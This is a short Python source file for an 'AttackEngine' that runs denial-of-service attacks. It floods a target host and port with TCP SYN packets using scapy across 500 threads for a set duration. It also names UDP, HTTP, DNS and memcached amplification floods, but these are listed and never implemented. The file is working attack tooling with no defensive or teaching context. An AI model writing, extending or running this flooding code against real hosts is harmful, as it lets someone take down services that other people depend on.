from typing import List, Optional
from scapy.all import IP, TCP, UDP, send
import threading, time

class AttackEngine:
    def __init__(self):
        self.vectors = ['syn_flood', 'udp_flood', 'http_flood', 'dns_torture', 'memcached_amp']
        self.running = False

    def syn_flood(self, target, port, duration, threads=500):
        def flood():
            end = time.time() + duration
            while time.time() < end and self.running:
                send(IP(dst=target)/TCP(dport=port, flags='S'), verbose=0)
        for _ in range(threads):
            threading.Thread(target=flood, daemon=True).start()

    def launch_attack(self, vector, target, port, duration=60):
        if vector not in self.vectors:
            return False
        self.running = True
        getattr(self, vector)(target, port, duration)
        return True

    def stop(self):
        self.running = False

